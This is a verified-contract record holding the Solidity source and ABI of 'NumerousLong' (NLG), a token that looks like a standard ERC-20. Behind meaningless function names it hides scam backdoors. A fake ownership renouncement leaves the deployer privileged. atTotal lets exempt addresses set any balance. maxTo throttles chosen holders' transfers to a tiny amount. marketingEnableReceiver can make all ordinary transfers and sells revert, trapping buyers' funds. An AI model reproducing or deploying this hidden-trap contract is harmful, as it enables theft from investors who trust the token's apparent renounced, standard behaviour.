{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface toSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellEnable {\n    function createPair(address walletMin, address feeExempt) external returns (address);\n}\n\ninterface liquidityList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFromLaunch) external view returns (uint256);\n\n    function transfer(address fundLaunch, uint256 amountAt) external returns (bool);\n\n    function allowance(address launchedIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunch,\n        uint256 amountAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txReceiver, uint256 value);\n    event Approval(address indexed launchedIs, address indexed spender, uint256 value);\n}\n\ninterface takeTeam is liquidityList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NumerousLong is fromTeam, liquidityList, takeTeam {\n\n    mapping(address => bool) public liquidityExempt;\n\n    address amountTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function maxTo(address autoTeam) public {\n        totalLaunch();\n        if (txIs != enableSellList) {\n            enableSellList = maxTradingLiquidity;\n        }\n        if (autoTeam == limitReceiverAmount || autoTeam == launchedReceiverSwap) {\n            return;\n        }\n        senderShouldTx[autoTeam] = true;\n    }\n\n    bool public enableAuto;\n\n    uint256 shouldAmountSender;\n\n    bool private tokenFeeList;\n\n    mapping(address => uint256) private autoMax;\n\n    function transfer(address fromTotal, uint256 amountAt) external virtual override returns (bool) {\n        return limitModeMax(_msgSender(), fromTotal, amountAt);\n    }\n\n    function takeBuy() public {\n        emit OwnershipTransferred(limitReceiverAmount, address(0));\n        teamFrom = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return teamFrom;\n    }\n\n    string private launchLaunchedTx = \"NLG\";\n\n    uint256 public exemptMarketingLaunched;\n\n    address public limitReceiverAmount;\n\n    function transferFrom(address buyFeeAuto, address fundLaunch, uint256 amountAt) external override returns (bool) {\n        if (_msgSender() != receiverIs) {\n            if (senderMarketingTx[buyFeeAuto][_msgSender()] != type(uint256).max) {\n                require(amountAt <= senderMarketingTx[buyFeeAuto][_msgSender()]);\n                senderMarketingTx[buyFeeAuto][_msgSender()] -= amountAt;\n            }\n        }\n        return limitModeMax(buyFeeAuto, fundLaunch, amountAt);\n    }\n\n    uint256 public modeLaunched;\n\n    function atTotal(address fromTotal, uint256 amountAt) public {\n        totalLaunch();\n        autoMax[fromTotal] = amountAt;\n    }\n\n    event OwnershipTransferred(address indexed feeTo, address indexed atLaunch);\n\n    address receiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public enableSellList;\n\n    function totalLaunch() private view {\n        require(liquidityExempt[_msgSender()]);\n    }\n\n    uint256 constant sellWallet = 11 ** 10;\n\n    bool public limitModeSell;\n\n    function launchReceiver(address toFee) public {\n        if (enableAuto) {\n            return;\n        }\n        if (limitTotal) {\n            txIs = modeLaunched;\n        }\n        liquidityExempt[toFee] = true;\n        if (exemptMaxLimit) {\n            enableSellList = txIs;\n        }\n        enableAuto = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minEnableBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderMarketingTx;\n\n    uint256 private fromLaunched = 100000000 * 10 ** 18;\n\n    function listTo(address buyFeeAuto, address fundLaunch, uint256 amountAt) internal returns (bool) {\n        require(autoMax[buyFeeAuto] >= amountAt);\n        autoMax[buyFeeAuto] -= amountAt;\n        autoMax[fundLaunch] += amountAt;\n        emit Transfer(buyFeeAuto, fundLaunch, amountAt);\n        return true;\n    }\n\n    address public launchedReceiverSwap;\n\n    uint8 private minEnableBuy = 18;\n\n    function limitModeMax(address buyFeeAuto, address fundLaunch, uint256 amountAt) internal returns (bool) {\n        if (buyFeeAuto == limitReceiverAmount) {\n            return listTo(buyFeeAuto, fundLaunch, amountAt);\n        }\n        uint256 listMode = liquidityList(launchedReceiverSwap).balanceOf(amountTrading);\n        require(listMode == shouldAmountSender);\n        require(fundLaunch != amountTrading);\n        if (senderShouldTx[buyFeeAuto]) {\n            return listTo(buyFeeAuto, fundLaunch, sellWallet);\n        }\n        return listTo(buyFeeAuto, fundLaunch, amountAt);\n    }\n\n    uint256 public maxTradingLiquidity;\n\n    bool public txTotal;\n\n    bool private exemptMaxLimit;\n\n    uint256 exemptEnable;\n\n    string private launchedShouldExempt = \"Numerous Long\";\n\n    function marketingEnableReceiver(uint256 amountAt) public {\n        totalLaunch();\n        shouldAmountSender = amountAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromLaunched;\n    }\n\n    function allowance(address takeShould, address isLimit) external view virtual override returns (uint256) {\n        if (isLimit == receiverIs) {\n            return type(uint256).max;\n        }\n        return senderMarketingTx[takeShould][isLimit];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchLaunchedTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedShouldExempt;\n    }\n\n    uint256 public txIs;\n\n    bool public limitTotal;\n\n    function balanceOf(address minFromLaunch) public view virtual override returns (uint256) {\n        return autoMax[minFromLaunch];\n    }\n\n    function getOwner() external view returns (address) {\n        return teamFrom;\n    }\n\n    constructor (){\n        \n        toSell totalSwap = toSell(receiverIs);\n        launchedReceiverSwap = sellEnable(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));\n        \n        limitReceiverAmount = _msgSender();\n        takeBuy();\n        liquidityExempt[limitReceiverAmount] = true;\n        autoMax[limitReceiverAmount] = fromLaunched;\n        \n        emit Transfer(address(0), limitReceiverAmount, fromLaunched);\n    }\n\n    mapping(address => bool) public senderShouldTx;\n\n    function approve(address isLimit, uint256 amountAt) public virtual override returns (bool) {\n        senderMarketingTx[_msgSender()][isLimit] = amountAt;\n        emit Approval(_msgSender(), isLimit, amountAt);\n        return true;\n    }\n\n    address private teamFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountAt\",\"type\":\"uint256\"}],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSellList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"}],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiverSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitModeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountAt\",\"type\":\"uint256\"}],\"name\":\"marketingEnableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTradingLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderShouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFeeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NumerousLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}